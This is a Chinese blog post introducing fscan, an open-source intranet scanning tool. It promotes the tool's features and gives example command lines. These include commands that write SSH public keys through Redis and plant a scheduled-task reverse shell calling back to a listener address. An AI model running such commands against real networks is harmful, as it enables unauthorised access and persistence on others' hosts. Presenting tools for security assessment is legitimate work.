---
layout: post
title: GitHub 开源项目 shadow1ng/fscan 介绍，一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。
tags: Go
---

大家好，又见面了，我是 GitHub 精选君！

###### 背景介绍

今天要给大家推荐一个 GitHub 开源项目 shadow1ng/fscan，该项目在 GitHub 有超过 9.2k Star。

![](https://stats.deeptrain.net/repo/shadow1ng/fscan/?theme=light)

一句话介绍该项目：一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。




![](https://raw.githubusercontent.com/shadow1ng/fscan/master/image/1.png)

![](https://raw.githubusercontent.com/shadow1ng/fscan/master/image/4.png)

![](https://raw.githubusercontent.com/shadow1ng/fscan/master/image/2.png)

![](https://raw.githubusercontent.com/shadow1ng/fscan/master/image/3.png)

![](https://raw.githubusercontent.com/shadow1ng/fscan/master/image/2020-12-12-13-34-44.png)

![](https://raw.githubusercontent.com/shadow1ng/fscan/master/image/netbios.png)

![](https://raw.githubusercontent.com/shadow1ng/fscan/master/image/netbios1.png)

![img.png](https://raw.githubusercontent.com/shadow1ng/fscan/master/image/live.png)

![](https://github.com/knownsec/404StarLink-Project/raw/master/logo.png)


###### 项目介绍

### fscan：一款全能型内网安全扫描工具

#### 背景介绍
随着信息技术的快速发展，企业内网的复杂程度日益增加，面对潜在的安全威胁，安全检测成为维护内网安全的重要手段。然而，传统的安全检测工具或服务往往仅覆盖有限的范围，无法全面评估和应对内网潜在的安全风险。特别是在大型网络环境中，信息搜集、漏洞扫描、服务爆破等多个阶段的工作量庞大，且极易漏洞令人头疼。针对这些问题，业界急需一种高效、全面的内网安全检测解决方案。

#### 

![](https://raw.githubusercontent.com/ZhuPeng/pic/master/mac/compress_tmp-496cbf55824923fcc20e0888cf8f0fcf.png)

项目介绍
[fscan](https://github.com/shadow1ng/fscan) 是一款强大的内网综合扫描工具，旨在为安全工程师提供一键自动化、全方位的漏扫扫描功能。该工具支持主机存活探测、端口扫描、常见服务的爆破、高危漏洞扫描如 ms17010、Redis 批量写公钥、计划任务反弹 shell、读取 Windows 网卡信息、Web 指纹识别、Web 漏洞扫描等功能，基本覆盖了内网安全检测的各个方面。此外，fscan 的设计理念注重易用性和效率，大大减轻了安全专家的工作负担。

#### 如何使用
fscan 的安装和使用相当简单，用户可以直接在 GitHub 上获取最新的可执行程序。以下是一些基本用法和示例：

- 简单用法:
```bash
fscan.exe -h 192.168.1.1/24  # 扫描整个C段，使用全部模块
```

- 指定模块和端口：
```bash
fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 # 指定模块ssh和端口2222扫描
```

- Redis 写公钥和计划任务反弹 shell：
```bash
fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub # Redis 写公钥
fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 # 计划任务反弹shell
```

对于 Linux 用户，可以使用 Arch Linux 的 AUR 安装：
```bash
yay -S fscan-git  # 或者 paru -S fscan-git
```

#### 项目推介
fscan 已经成为许多安全专家和组织在内网检测与评估工作中的首选工具。其不仅开发活跃，且作者 shadow1ng 是信息安全领域内知名人士，在业界拥有良好的口碑。此外，该项目也是 404Team 星链计划 2.0 的一部分，这个计划聚集了许多优秀的安全工具和专家，提供了丰富的资源和强有力的社区支持。凭借着强大的功能、简便的操作和活跃的社区支持，fscan 已经获得了广泛的认可和好评，无论是对于安全新手还是老手来说，都是一个值得入手和长期关注的工具。

以下是该项目 Star 趋势图（代表项目的活跃程度）：

![](https://api.star-history.com/svg?repos=shadow1ng/fscan&type=Timeline)

更多项目详情请查看如下链接。

开源项目地址：https://github.com/shadow1ng/fscan 

开源项目作者：shadow1ng

开源协议：

以下是参与项目建设的所有成员：

![](https://contrib.rocks/image?repo=shadow1ng/fscan)

关注我们，一起探索有意思的开源项目。

